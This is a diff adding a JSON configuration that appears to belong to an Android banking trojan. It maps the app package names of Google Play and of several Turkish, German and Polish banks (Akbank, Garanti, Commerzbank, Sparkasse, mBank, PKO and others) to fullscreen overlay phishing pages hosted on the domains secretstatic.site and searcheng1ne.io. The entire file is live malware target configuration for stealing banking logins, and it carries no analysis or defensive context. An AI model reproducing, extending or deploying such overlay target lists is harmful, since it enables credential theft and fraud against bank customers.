@@ -1,0 +1,128 @@
+[
+	{
+		"name" : "google_play",
+		"type" : "window",
+		"link" : "http://secretstatic.site/links/GooglePlay/index.html",
+		"apps" : ["com.android.vending", "com.google.android.music"]
+	}, {
+		"name" : "Akbank",
+		"type" : "fullscreen",
+		"link" : "http://secretstatic.site/links/TR/Akbank/index.html",
+		"apps" : ["com.akbank.android.apps.akbank_direkt", "com.akbank.softotp"]
+	}, {
+		"name" : "Finansbank",
+		"type" : "fullscreen",
+		"link" : "http://secretstatic.site/links/TR/Finansbank/index.html",
+		"apps" : ["com.finansbank.mobile.cepsube"]
+	}, {
+		"name" : "Garanti",
+		"type" : "fullscreen",
+		"link" : "http://secretstatic.site/links/TR/Garanti/index.html",
+		"apps" : ["com.garanti.cepsubesi", "com.garanti.cepbank", "biz.mobinex.android.apps.cep_sifrematik"]
+	}, {
+		"name" : "Halkbank",
+		"type" : "fullscreen",
+		"link" : "http://secretstatic.site/links/TR/Halkbank/index.html",
+		"apps" : ["com.tmobtech.halkbank"]
+	}, {
+		"name" : "Isbank",
+		"type" : "fullscreen",
+		"link" : "http://secretstatic.site/links/TR/Isbank/index.html",
+		"apps" : ["com.pozitron.iscep"]
+	}, {
+		"name" : "Vakifbank",
+		"type" : "fullscreen",
+		"link" : "http://secretstatic.site/links/TR/Vakifbank/index.html",
+		"apps" : ["com.vakifbank.mobile"]
+	}, {
+		"name" : "YapiKredi",
+		"type" : "fullscreen",
+		"link" : "http://secretstatic.site/links/TR/YapiKredi/index.html",
+		"apps" : ["com.ykb.android"]
+	}, {
+		"name" : "Ziraat",
+		"type" : "fullscreen",
+		"link" : "http://secretstatic.site/links/TR/Ziraat/index.html",
+		"apps" : ["com.ziraat.ziraatmobil"]
+	}, {
+		"name" : "ComDirect",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/DE/ComDirect/index.html",
+		"apps" : ["de.comdirect.android"]
+	}, {
+		"name" : "CommerzBank",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/DE/CommerzBank/index.html",
+		"apps" : ["de.commerzbanking.mobil"]
+	}, {
+		"name" : "ConsorsBank",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/DE/ConsorsBank/index.html",
+		"apps" : ["de.consorsbank"]
+	}, {
+		"name" : "DeutscheBank",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/DE/DeutscheBank/index.html",
+		"apps" : ["com.db.mm.deutschebank"]
+	}, {
+		"name" : "DKB",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/DE/DKB/index.html",
+		"apps" : ["de.dkb.portalapp"]
+	}, {
+		"name" : "ING DiBa",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/DE/ING_DiBa/index.html",
+		"apps" : ["com.ing.diba.mbbr2"]
+	}, {
+		"name" : "PostBank",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/DE/PostBank/index.html",
+		"apps" : ["de.postbank.finanzassistent"]
+	}, {
+		"name" : "Santander",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/DE/Santander/index.html",
+		"apps" : ["mobile.santander.de"]
+	}, {
+		"name" : "Sparkasse",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/DE/Sparkasse/index.html",
+		"apps" : ["com.starfinanz.smob.android.*"]
+	}, {
+		"name" : "VolksBank",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/DE/VolksBank/index.html",
+		"apps" : ["de.fiducia.smartphone.android.banking.vr"]
+	}, 	{
+		"name" : "mbank",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/PL/mbank/index.html",
+		"apps" : ["pl.mbank"]
+	}, {
+		"name" : "pekao24",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/PL/pekao24/index.html",
+		"apps" : ["eu.eleader.mobilebanking.pekao"]
+	}, {
+		"name" : "ipko",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/PL/ipko/index.html",
+		"apps" : ["pl.pkobp.iko"]
+	}, {
+		"name" : "aliorbank",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/PL/aliorbank/index.html",
+		"apps" : ["com.comarch.mobile"]
+	}, {
+		"name" : "getinbank",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/PL/getinbank/index.html",
+		"apps" : ["com.getingroup.mobilebanking"]
+	}, {
+		"name" : "ingbank",
+		"type" : "fullscreen",
+		"link" : "http://searcheng1ne.io/links/PL/ingbank/index.html",
+		"apps" : ["pl.ing.ingmobile", "pl.ing.mojeing"]
+	}
+]
